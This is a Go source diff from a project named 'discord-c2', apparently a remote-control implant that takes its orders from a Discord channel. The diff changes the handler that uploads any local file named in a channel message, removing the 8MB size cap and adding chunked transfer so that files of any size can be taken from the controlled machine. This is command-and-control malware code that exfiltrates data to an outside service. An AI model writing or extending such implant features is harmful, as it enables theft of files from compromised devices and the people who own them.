@@ -7,17 +7,15 @@ import (
 	"io"
 	"log"
 	"os"
-	"path/filepath"
 	"strings"
 
 	"discord-c2/internal/httpx"
 	"discord-c2/internal/jobs"
 	"discord-c2/internal/media"
+	"discord-c2/internal/transfer"
 
 	"github.com/bwmarrin/discordgo"
 )
-
-const maxDiscordFileSize = 8388608
 
 // handler processes messages in the per-device channel, wiring emoji and text
 // shortcuts to the same capabilities exposed via slash commands.
@@ -88,7 +86,8 @@ func handler(s *discordgo.Session, m *discordgo.MessageCreate) {
 	}
 }
 
-// sendFileToChannel uploads the local file named in a 👇 message.
+// sendFileToChannel uploads the local file named in a 👇 message, splitting it
+// into parts when it exceeds the configured chunk size.
 func sendFileToChannel(s *discordgo.Session, m *discordgo.MessageCreate) int {
 	parts := strings.Fields(m.Content)
 	if len(parts) < 2 {
@@ -97,28 +96,17 @@ func sendFileToChannel(s *discordgo.Session, m *discordgo.MessageCreate) int {
 	}
 
 	fileName := expandHome(strings.TrimSpace(parts[1]))
-	f, err := os.Open(fileName)
+	fi, err := os.Stat(fileName)
 	if err != nil {
-		s.ChannelMessageSendReply(m.ChannelID, "Cannot open file: "+fileName+" ("+err.Error()+")", m.Reference())
+		s.ChannelMessageSendReply(m.ChannelID, "Cannot read file: "+fileName+" ("+err.Error()+")", m.Reference())
 		return 0
 	}
-	defer f.Close()
-
-	fi, err := f.Stat()
-	if err != nil {
-		s.ChannelMessageSendReply(m.ChannelID, "Cannot stat file: "+fileName+" ("+err.Error()+")", m.Reference())
-		return 0
-	}
-	if fi.Size() >= maxDiscordFileSize {
-		s.ChannelMessageSendReply(m.ChannelID, "File is bigger than 8MB 😔", m.Reference())
+	if fi.IsDir() {
+		s.ChannelMessageSendReply(m.ChannelID, fileName+" is a directory", m.Reference())
 		return 0
 	}
 
-	_, err = s.ChannelMessageSendComplex(m.ChannelID, &discordgo.MessageSend{
-		Files:     []*discordgo.File{{Name: filepath.Base(fileName), Reader: f}},
-		Reference: m.Reference(),
-	})
-	if err != nil {
+	if err := transfer.Send(s, m.ChannelID, m.Reference(), fileName, transferChunkSize); err != nil {
 		s.ChannelMessageSendReply(m.ChannelID, "Upload failed: "+err.Error(), m.Reference())
 		return 0
 	}
